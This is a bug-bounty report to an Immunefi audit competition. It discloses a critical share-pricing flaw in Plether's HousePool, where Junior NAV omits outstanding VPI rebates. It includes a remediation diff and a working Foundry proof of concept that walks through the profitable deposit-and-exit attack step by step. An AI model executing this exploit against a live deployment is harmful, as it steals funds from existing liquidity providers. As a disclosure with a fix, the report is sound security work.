# \#99747 [SC-Critical] Junior share price omits the VPI rebate owed back to the pool, so deposits during an open rebate mint cheap shares at existing LPs' expense

**Submitted on Nov 15th 2026 at 04:40:32 UTC by @jh42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99747
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Brief/Intro

A skew-reducing trade is paid a negative VPI, a rebate, from pool cash, and the pool takes the whole rebate back when the position closes (the lifetime clamp, `CloseAccountingLib.sol` L112-L118) or is liquidated (`MarginClearinghouse.consumeVpiRebateReserve`). The terminal NAV that prices Junior deposits and redemptions books the payout as a loss and has no term for the rebate the pool is owed (`HousePoolAccountingLib.sol` L60-L78, `CfdEngineProtocolLens.sol` L62-L72). A Junior deposit that the permissionless epoch settlement activates while a rebated position is open buys shares below value, and the returned rebate is then split with those shares at the expense of the Junior LPs already in. In the PoC, with a 2,444.35 USDG rebate outstanding, the value of 1e9 Junior share units is 0.999926 against 1.002403 before the open; a 5,000,000 USDG deposit activates at that price and exits at 1.000323, and the honest Junior LP ends 1,985.77 USDG below the no-deposit control. The depositor gains 781.53 USDG after 1,200.00 of fees when its own trading account holds the rebated position, and 1,984.45 USDG without one when an unrelated trader holds it.

## Root cause

- The pool pays the rebate and locks it in a per-account reserve.

```solidity
// CfdEngineSettlementSidecar.sol L442-L444
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}

// CfdEngineSettlementSidecar.sol L466-L477 (abbreviated)
if (delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets) {
    ...
        clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
    ...
        clearinghouse.reclassifyPnlPledgeToVpiRebateReserve(delta.account, delta.vpiRebateReserveFromPledgeAssets);
}
```

- The close takes it back in full through the lifetime clamp, and the close and liquidation paths send the reserve to the pool.

```solidity
// CloseAccountingLib.sol L103-L118
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
// ... (inputs.poolDepthAssets != 0 computes the fresh VPI)
// The lifetime clamp below still recovers any previously received negative VPI.
...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}

// CfdEngineSettlementSidecar.sol L692 (close) and L803 (liquidation)
clearinghouse.consumeVpiRebateReserve(delta.account, host.pool(), delta.vpiRebateReserveConsumedAssets);

// MarginClearinghouse.sol L883-L906 (consumeVpiRebateReserve), abbreviated
/// @notice Returns reserved negative-VPI backing to the LP pool as cash recovery.
...
vpiRebateReserveBalances[account] -= amountAssets;
...
IERC20(settlementAsset).safeTransfer(recipient, amountAssets);
```

- The NAV has no term for the rebate the pool is owed.

```solidity
// HousePoolAccountingLib.sol L60-L78
uint256 terminalAssets = engineSnapshot.physicalAssets;                // pool cash
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets; // trader claims
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;      // marked price PnL only
...

// CfdEngineProtocolLens.sol L62-L72 (abbreviated)
snapshot.physicalAssets = poolAssets;
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
```

- Epoch settlement reconciles first and prices both deposits and redemptions on the resulting Junior principal.

```solidity
// HousePool.sol L835-L841 and L915-L919
_reconcile(accountingSnapshot, statusSnapshot);
...
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
...
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
```

## Impact

```
// DEPLOYMENT.md L123-L156 (Initial release parameters)
CAP_PRICE 2e8, vpiFactor 0.01e18, maxSkewRatio 0.4e18, maintMarginBps 10, initMarginBps 20, fadMarginBps 300,
baseCarryBps 500, minBountyAssets 1e6, bountyBps 10, keeperShareBps 5_000, protocolShareBps 0,
executionFeeBps 4, maxSeniorExposureAssets 40_000_000e6, maxSeniorShareBps 8_000, Senior / Junior seed 1e6 each
```

- **Theft of principal.**
  - The depositor withdraws 5,000,000 plus its gain as plain tokens, and the honest Junior LP's shares end 1,985.77 below the no-deposit outcome.
- **Requirements.**
  - A Junior deposit that activates while a rebated position is open; the epoch settlement that activates it is the permissionless `router.settleLpEpoch`.
  - A rebated position: any trader who takes the minority side of a skew that another trader holds, which can be the depositor's own account.
  - The rebated position closes or is liquidated before the depositor's exit is priced.
  - No privileged role, no oracle manipulation and no non-default parameter.
  - Keepers are untrusted: the epoch settlement and the trades are permissionless calls.
- The variant without a trading account needs only the Junior deposit and the exit request, and pays no fee.

## User story

- Alice deposits 1,000,000 USDG into Junior and the Senior LP holds 3,600,000.
- Bob holds a 1,500,000 USDG LONG.
- Mallory queues a 5,000,000 USDG Junior deposit and her trading account opens a 1,500,000 USDG SHORT that removes Bob's skew.
  - The pool pays a 2,444.35 rebate; while it is outstanding, the value of 1e9 Junior share units is 0.999926, against 1.002403 before.
- Anyone calls `router.settleLpEpoch`: Mallory's deposit activates at the lower price.
- Mallory closes the SHORT, the pool takes the rebate back, and by her exit the value of 1e9 Junior share units is 1.000323.
- After the one-hour cooldown Mallory exits.
  - Alice ends 1,985.77 USDG lower than if Mallory had not deposited.
  - Mallory ends 781.53 higher after 1,200.00 of fees.
- If Carol, an unrelated trader, holds the rebated SHORT instead, Mallory needs no trading account and ends 1,984.45 higher, and Alice ends the same 1,985.77 lower.

## Recommendation

```diff
--- a/packages/perps/src/MarginClearinghouse.sol
+++ b/packages/perps/src/MarginClearinghouse.sol
@@ -47,6 +47,8 @@
     mapping(address => uint256) internal reservedSettlementAssets;
     /// @dev Mandatory negative-lifetime-VPI floor contained inside `reservedSettlementAssets`; never counted twice.
     mapping(address => uint256) internal vpiRebateReserveBalances;
+    /// @notice Sum of every account's negative-VPI rebate reserve: the amount the pool recovers at close or liquidation.
+    uint256 public totalVpiRebateReserveAssets;
     mapping(address => uint256) internal liquidationReserveBalances;
     mapping(uint64 => IMarginClearinghouse.OrderReservation) internal orderReservations;
     mapping(address => uint256) internal activeCommittedOrderReservationAssets;
@@ -849,6 +851,7 @@
         }
         _lockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
     }
 
     /// @notice Reclassifies newly locked PnL pledge into mandatory negative-VPI backing without moving cash.
@@ -862,6 +865,7 @@
         _consumeLockedMargin(account, IMarginClearinghouse.MarginBucket.Position, amountAssets);
         reservedSettlementAssets[account] += amountAssets;
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
         emit MarginLocked(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
     }
 
@@ -877,6 +881,7 @@
             revert MarginClearinghouse__ActionReserveMismatch();
         }
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;
         _unlockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
     }
 
@@ -899,6 +904,7 @@
             revert MarginClearinghouse__ActionReserveMismatch();
         }
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;
         reservedSettlementAssets[account] -= amountAssets;
         settlementBalances[account] -= amountAssets;
         IERC20(settlementAsset).safeTransfer(recipient, amountAssets);
--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
@@ -6,6 +6,7 @@
 import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
 import {ICfdEngineProtocolLens} from "@plether/perps/interfaces/ICfdEngineProtocolLens.sol";
 import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
+import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
 import {ProtocolLensViewTypes} from "@plether/perps/interfaces/ProtocolLensViewTypes.sol";
 import {OracleFreshnessPolicyLib} from "@plether/perps/libraries/OracleFreshnessPolicyLib.sol";
 import {SolvencyAccountingLib} from "@plether/perps/libraries/SolvencyAccountingLib.sol";
@@ -67,7 +68,9 @@
         snapshot.supplementalReservedAssets = SolvencyAccountingLib.settlementBufferTargetAssets(
             snapshot.maxLiabilityAssets, engineContract.settlementBufferBps()
         );
-        snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
+        // Outstanding negative-VPI rebates are recovered by the pool at close or liquidation: an LP receivable.
+        snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets
+            + int256(IMarginClearinghouse(engineContract.clearinghouse()).totalVpiRebateReserveAssets());
         snapshot.terminalNavBookVersion = terminalSnapshot.bookVersion;
         snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
         snapshot.hasOpenPositions = terminalSnapshot.hasOpenPositions;
--- a/packages/perps/src/interfaces/IMarginClearinghouse.sol
+++ b/packages/perps/src/interfaces/IMarginClearinghouse.sol
@@ -298,6 +298,9 @@
         address account
     ) external view returns (uint256);
 
+    /// @notice Sum of every account's negative-VPI rebate reserve.
+    function totalVpiRebateReserveAssets() external view returns (uint256);
+
     /// @notice Returns the reservation record for a specific order id.
     /// @param orderId Order reservation id to inspect
     /// @return reservation Persistent reservation record; unknown ids return a zero-valued record
```

## Proof of Concept

```bash
forge test --root packages/perps --match-path test/perps/LpDepositWhileVpiRebateOutstanding.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Release risk parameters (DEPLOYMENT.md), router minimum open notional 1,000 USDG and adverse confidence
///      multiplier 2,500 bps applied through the 72-hour admin path, Senior limits 40M / 8,000 bps. Honest Junior LP:
///      this contract (1,000,000 USDG). Senior LP: 3,600,000 USDG. In each round every trade and LP request goes
///      through the router and the tranche vaults, and epochs settle through the permissionless
///      `router.settleLpEpoch`.
contract LpDepositWhileVpiRebateOutstandingTest is BasePerpTest {

    address internal constant KEEPER = address(0x4E3E);
    address internal constant SENIOR_LP = address(0x5E);
    address internal constant BOB = address(0xB0B);
    address internal constant MALLORY_LP = address(0xBAD1);
    address internal constant MALLORY_TRADER = address(0xBAD2);
    address internal constant CAROL = address(0xCA201);

    uint256 internal constant SKEW = 1_500_000e18; // 1,500,000 USDG of notional at a mark of 1.00
    uint256 internal constant DEPOSIT = 5_000_000e6;
    uint256 internal constant SHARE_UNIT = 1e9; // about one USDG of Junior shares: the vault mints 1,000 share units per USDG atom

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev Release seeds: 1 USDG on each tranche.
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1000e6;
        rc.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(rc);
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(pc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();

        _fundSenior(SENIOR_LP, 3_600_000e6);
        _fundTrader(BOB, 400_000e6);
        _fundTrader(MALLORY_TRADER, 400_000e6);
        _fundTrader(CAROL, 400_000e6);
        _refreshMark(1e8);
    }

    // ------------------------------------------------------------------ helpers (real router and vault flows)

    function _commit(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 id) {
        vm.prank(a);
        id = router.commitOrder(side, size, margin, 0, isClose);
    }

    function _exec(
        uint64 id,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
        router.updateMarkPrice(updateData);
    }

    function _settleEpoch() internal {
        bytes[] memory data = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _vpiAccrued(
        address a
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    /// @dev Value of the honest Junior LP's shares as the vault itself prices them, after the pool's pending reconcile.
    function _honestJuniorValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    // ------------------------------------------------------------------ one round, with or without the deposit

    struct Round {
        int256 rebate; // negative VPI paid to the trader at open
        uint256 honestValueBeforeOpen;
        uint256 honestValueAfterActivation;
        uint256 honestValueEnd;
        uint256 priceBeforeOpen; // USDG value of SHARE_UNIT Junior share units
        uint256 priceAtActivation;
        uint256 priceAtExit;
        uint256 shares;
        uint256 fees; // execution fees the rebated trader pays on both legs
        int256 traderResult; // the rebated trader's own balance change over the round
        int256 profit; // attacker's LP and trading accounts together
    }

    function _round(
        bool withDeposit,
        address shortTrader
    ) internal returns (Round memory r) {
        // An unrelated trader holds a 1.5M LONG, which is the skew that a SHORT can reduce for a rebate.
        _exec(_commit(BOB, CfdTypes.Side.LONG, SKEW, 20_000e6, false), 1e8);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _refreshMark(1e8);
        r.honestValueBeforeOpen = _honestJuniorValue();
        r.priceBeforeOpen = juniorVault.convertToAssets(SHARE_UNIT);
        uint256 traderBefore = clearinghouse.balanceAssets(shortTrader);
        (uint256 depositEpoch,) = juniorVault.getRequestEpochWindow();

        // 1. The attacker queues a Junior deposit. The control run follows the same timeline without it.
        if (withDeposit) {
            settlementToken.mint(MALLORY_LP, DEPOSIT);
            vm.startPrank(MALLORY_LP);
            settlementToken.approve(address(juniorVault), DEPOSIT);
            assertEq(juniorVault.requestDeposit(DEPOSIT, MALLORY_LP, MALLORY_LP), depositEpoch);
            vm.stopPrank();
        }

        // 2. A trader takes the other side of the skew and is paid a VPI rebate.
        uint256 treasuryBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        _exec(_commit(shortTrader, CfdTypes.Side.SHORT, SKEW, 20_000e6, false), 1e8);
        r.rebate = _vpiAccrued(shortTrader);

        // 3. The epoch settles with the rebate outstanding: the deposit is priced on the reduced NAV.
        vm.warp(juniorVault.depositEpochStart(depositEpoch));
        if (withDeposit) {
            _settleEpoch();
            uint256 claimable = juniorVault.claimableDepositRequest(depositEpoch, MALLORY_LP);
            vm.prank(MALLORY_LP);
            r.shares = juniorVault.claimDeposit(depositEpoch, claimable, MALLORY_LP, MALLORY_LP);
        }
        if (!withDeposit) {
            _refreshMark(1e8);
        }
        r.honestValueAfterActivation = _honestJuniorValue();
        r.priceAtActivation = juniorVault.convertToAssets(SHARE_UNIT);

        // 4. The trading account closes. The lifetime clamp returns the whole rebate to the pool.
        _exec(_commit(shortTrader, CfdTypes.Side.SHORT, SKEW, 0, true), 1e8);

        r.fees = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryBefore;
        r.traderResult = int256(clearinghouse.balanceAssets(shortTrader)) - int256(traderBefore);

        // 5. After the one-hour cooldown the attacker exits at the recovered NAV.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        (uint256 redeemEpoch,) = juniorVault.getRequestEpochWindow();
        if (withDeposit) {
            vm.prank(MALLORY_LP);
            assertEq(juniorVault.requestRedeem(r.shares, MALLORY_LP, MALLORY_LP), redeemEpoch);
        }
        vm.warp(pool.lpEpochStart(redeemEpoch));
        if (withDeposit) {
            _settleEpoch();
            uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemEpoch, MALLORY_LP);
            vm.prank(MALLORY_LP);
            juniorVault.claimRedeem(redeemEpoch, claimableShares, MALLORY_LP, MALLORY_LP);
            r.profit = int256(settlementToken.balanceOf(MALLORY_LP)) - int256(DEPOSIT);
        }
        if (shortTrader == MALLORY_TRADER) {
            r.profit += int256(clearinghouse.balanceAssets(MALLORY_TRADER)) - int256(traderBefore);
        }
        _refreshMark(1e8);
        r.honestValueEnd = _honestJuniorValue();
        r.priceAtExit = juniorVault.convertToAssets(SHARE_UNIT);
    }

    function _log(
        string memory title,
        Round memory r,
        bool withDeposit
    ) internal {
        emit log(title);
        emit log_named_decimal_int("VPI rebate paid to the trader at open          ", r.rebate, 6);
        emit log_named_decimal_uint("value of 1e9 Junior share units before the open", r.priceBeforeOpen, 6);
        emit log_named_decimal_uint("value of 1e9 Junior share units at activation  ", r.priceAtActivation, 6);
        emit log_named_decimal_uint("value of 1e9 Junior share units at the exit    ", r.priceAtExit, 6);
        emit log_named_decimal_uint("honest Junior value before the open            ", r.honestValueBeforeOpen, 6);
        emit log_named_decimal_uint("honest Junior value at activation              ", r.honestValueAfterActivation, 6);
        emit log_named_decimal_uint("honest Junior value at the end                 ", r.honestValueEnd, 6);
        emit log_named_decimal_uint("execution fees paid by the rebated trader      ", r.fees, 6);
        emit log_named_decimal_int("rebated trader's own result (fees, carry)      ", r.traderResult, 6);
        if (withDeposit) {
            emit log_named_decimal_uint("depositor Junior share units minted            ", r.shares, 6);
            emit log_named_decimal_int("depositor profit                               ", r.profit, 6);
        }
    }

    /// @dev Three runs from one state. Run 1: the depositor's own trading account takes the rebate and pays the fees.
    ///      Run 2: an unrelated trader (Carol) opens and closes on her own; the depositor holds no trading account and
    ///      pays no fee. Run 3: the control, the same trades and warps without the deposit. Every figure is logged
    ///      before the assertions.
    function test_DepositActivatedWhileARebateIsOutstandingTakesValueFromTheExistingJuniorLp() public {
        uint256 start = vm.snapshotState();
        Round memory ownAccount = _round(true, MALLORY_TRADER);
        vm.revertToState(start);
        Round memory unrelatedTrader = _round(true, CAROL);
        vm.revertToState(start);
        Round memory control = _round(false, CAROL);

        int256 honestLossOwnAccount = int256(control.honestValueEnd) - int256(ownAccount.honestValueEnd);
        int256 honestLossUnrelatedTrader = int256(control.honestValueEnd) - int256(unrelatedTrader.honestValueEnd);

        _log("--- run 1: deposit, the depositor's own trading account takes the rebate ---", ownAccount, true);
        _log("--- run 2: deposit, an unrelated trader (Carol) takes the rebate ---", unrelatedTrader, true);
        _log("--- run 3: control, the same trades and warps without the deposit ---", control, false);
        emit log("--- honest Junior LP against the control ---");
        emit log_named_decimal_int("honest Junior LP loss, run 1 against run 3     ", honestLossOwnAccount, 6);
        emit log_named_decimal_int("honest Junior LP loss, run 2 against run 3     ", honestLossUnrelatedTrader, 6);

        assertLt(ownAccount.rebate, 0, "run 1: the SHORT is paid a VPI rebate");
        assertLt(unrelatedTrader.rebate, 0, "run 2: the SHORT is paid a VPI rebate");
        assertGt(ownAccount.profit, 0, "run 1: the depositor profits");
        assertGt(unrelatedTrader.profit, 0, "run 2: the depositor profits");
        assertGt(honestLossOwnAccount, 0, "run 1: the honest Junior LP ends below the no-deposit control");
        assertGt(honestLossUnrelatedTrader, 0, "run 2: the honest Junior LP ends below the no-deposit control");
    }

}
```

### Output

```
Ran 1 test for test/perps/LpDepositWhileVpiRebateOutstanding.t.sol:LpDepositWhileVpiRebateOutstandingTest
[PASS] test_DepositActivatedWhileARebateIsOutstandingTakesValueFromTheExistingJuniorLp() (gas: 24123974)
Logs:
  --- run 1: deposit, the depositor's own trading account takes the rebate ---
  VPI rebate paid to the trader at open          : -2444.351539
  value of 1e9 Junior share units before the open: 1.002403
  value of 1e9 Junior share units at activation  : 0.999926
  value of 1e9 Junior share units at the exit    : 1.000323
  honest Junior value before the open            : 1002413.755448
  honest Junior value at activation              : 999936.536321
  honest Junior value at the end                 : 1000333.392630
  execution fees paid by the rebated trader      : 1200.000000
  rebated trader's own result (fees, carry)      : -1202.921697
  depositor Junior share units minted            : 5000367342.067878
  depositor profit                               : 781.531453
  --- run 2: deposit, an unrelated trader (Carol) takes the rebate ---
  VPI rebate paid to the trader at open          : -2444.351539
  value of 1e9 Junior share units before the open: 1.002403
  value of 1e9 Junior share units at activation  : 0.999926
  value of 1e9 Junior share units at the exit    : 1.000323
  honest Junior value before the open            : 1002413.755448
  honest Junior value at activation              : 999936.536321
  honest Junior value at the end                 : 1000333.392630
  execution fees paid by the rebated trader      : 1200.000000
  rebated trader's own result (fees, carry)      : -1202.921697
  depositor Junior share units minted            : 5000367342.067878
  depositor profit                               : 1984.453150
  --- run 3: control, the same trades and warps without the deposit ---
  VPI rebate paid to the trader at open          : -2444.351539
  value of 1e9 Junior share units before the open: 1.002403
  value of 1e9 Junior share units at activation  : 0.999926
  value of 1e9 Junior share units at the exit    : 1.002309
  honest Junior value before the open            : 1002413.755448
  honest Junior value at activation              : 999936.545454
  honest Junior value at the end                 : 1002319.162317
  execution fees paid by the rebated trader      : 1200.000000
  rebated trader's own result (fees, carry)      : -1204.218768
  --- honest Junior LP against the control ---
  honest Junior LP loss, run 1 against run 3     : 1985.769687
  honest Junior LP loss, run 2 against run 3     : 1985.769687

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 36.45ms (30.75ms CPU time)

Ran 1 test suite in 36.94ms (36.45ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
